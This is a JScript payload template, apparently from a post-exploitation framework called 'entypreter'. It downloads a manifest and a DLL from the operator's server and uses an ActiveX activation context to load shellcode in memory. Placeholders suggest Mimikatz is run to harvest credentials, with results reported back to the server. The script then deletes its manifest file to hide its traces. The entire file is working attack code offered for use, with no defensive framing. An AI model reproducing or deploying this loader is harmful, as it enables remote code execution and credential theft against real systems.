try
{
    var manifestPath = entypreter.file.getPath("~DIRECTORY~\\TashLib.manifest");
    entypreter.http.download(manifestPath, "~MANIFESTUUID~");

    entypreter.http.download("~DIRECTORY~\\TashLib.dll", "~DLLUUID~");

    var actCtx = new ActiveXObject( "Microsoft.Windows.ActCtx" );
    actCtx.Manifest = manifestPath;
    var tash =  actCtx.CreateObject("TashLib.TashLoader");

    var shim_lpParam = "~MIMICMD~~~~UUIDHEADER~~~~SHIMX64UUID~~~~MIMIX86UUID~~~~MIMIX64UUID~~~" + entypreter.work.make_url();

    // TSC = "\x..."
    ~SHIMX86BYTES~

    var res = tash.Load(TSC, shim_lpParam, ~SHIMX86OFFSET~);

    entypreter.work.report("Success");
}
catch (e)
{
    entypreter.work.error(e);
}

entypreter.file.deleteFile(manifestPath);
entypreter.exit();
